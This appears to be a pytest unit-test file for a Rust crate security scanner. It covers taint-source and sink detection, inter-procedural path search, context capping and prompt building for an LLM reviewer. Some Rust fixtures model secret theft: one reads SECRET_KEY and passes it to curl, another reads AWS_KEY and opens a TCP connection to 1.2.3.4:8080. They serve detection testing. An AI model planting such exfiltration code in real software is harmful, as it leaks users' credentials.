"""Unit tests for taintflow analysis, call graph, path search, and prompt generation."""

import pytest
from crateshield.taintflow import (
    RustASTParser, CrateCallGraph, TaintEngine, extract_taint_context,
)
from harness.hybrid_taint import build_hybrid_taint_prompt


def test_ast_source_sink_detection():
    parser = RustASTParser()
    code = """
    use std::env;
    use std::process::Command;

    fn exfil() {
        let key = env::var("SECRET_KEY").unwrap();
        Command::new("curl").arg(key).spawn().unwrap();
    }
    """
    info = parser.parse_file("src/lib.rs", code)
    assert len(info.functions) == 1
    fn = info.functions[0]
    assert fn.name == "exfil"
    assert len(fn.direct_sources) > 0
    assert any("env::var" in s.pattern for s in fn.direct_sources)
    assert len(fn.direct_sinks) > 0
    assert any("Command" in s.pattern for s in fn.direct_sinks)


def test_inter_procedural_forward_path():
    parser = RustASTParser()
    code1 = """
    use std::env;
    fn read_secret() -> String {
        env::var("AWS_KEY").unwrap_or_default()
    }
    """
    code2 = """
    use std::net::TcpStream;
    fn send_out(data: String) {
        let _ = TcpStream::connect("1.2.3.4:8080");
    }
    """
    code_main = """
    fn run() {
        let s = read_secret();
        send_out(s);
    }
    """
    cg = CrateCallGraph()
    cg.add_file(parser.parse_file("src/secret.rs", code1))
    cg.add_file(parser.parse_file("src/net.rs", code2))
    cg.add_file(parser.parse_file("src/main.rs", code_main))
    cg.build_edges()

    engine = TaintEngine(max_depth=4)
    paths = engine.find_taint_paths(cg)
    assert len(paths) >= 1
    # Check that coordinator path [read_secret, run, send_out] was found
    coord_paths = [p for p in paths if p.path_type == "coordinator"]
    assert len(coord_paths) >= 1
    p = coord_paths[0]
    names = [n.name for n in p.nodes]
    assert "read_secret" in names
    assert "run" in names
    assert "send_out" in names


def test_fallback_mode_when_disconnected():
    view = {
        "name": "isolated_crate",
        "version": "0.1.0",
        "source_files": {
            "src/lib.rs": "fn do_math(a: i32, b: i32) -> i32 { a + b }",
            "build.rs": 'fn main() { println!("cargo:rerun-if-changed=build.rs"); }',
        },
        "build_rs": 'fn main() { println!("cargo:rerun-if-changed=build.rs"); }',
        "build_script_path": "build.rs",
    }
    res = extract_taint_context(view)
    assert res["fallback_used"] is True
    assert "NOTE: No connected source-sink path found" in res["formatted_text"]
    assert "build.rs" in res["formatted_text"]


def test_context_budget_capping():
    huge_body = "\n".join(f'    let x_{i} = "{i}" * 100;' for i in range(1000))
    huge_code = f"fn big_fn() {{\n{huge_body}\n}}"
    view = {
        "name": "huge_crate",
        "version": "0.1.0",
        "source_files": {
            "build.rs": f'fn main() {{\n    std::env::var("FOO");\n    std::process::Command::new("sh");\n}}\n{huge_code}',
        },
        "build_rs": f'fn main() {{\n    std::env::var("FOO");\n    std::process::Command::new("sh");\n}}\n{huge_code}',
    }
    res = extract_taint_context(view, max_total_chars=10000)
    assert res["total_chars"] <= 10000


def test_prompt_construction():
    signals = {"source_scan": {"env_var_access": True}}
    taint_context = {
        "formatted_text": "=== Taint Flow Path 1 ===\nfn steal() {}",
        "paths_found": 1,
        "path_lengths": [1],
        "fallback_used": False,
        "total_chars": 50,
        "omitted_regions": [],
    }
    messages = build_hybrid_taint_prompt(signals, taint_context)
    assert len(messages) >= 2
    user_msg = messages[-1]["content"]
    assert "<untrusted_crate_data>" in user_msg
    assert "</untrusted_crate_data>" in user_msg
    assert "=== Taint Flow Path 1 ===" in user_msg
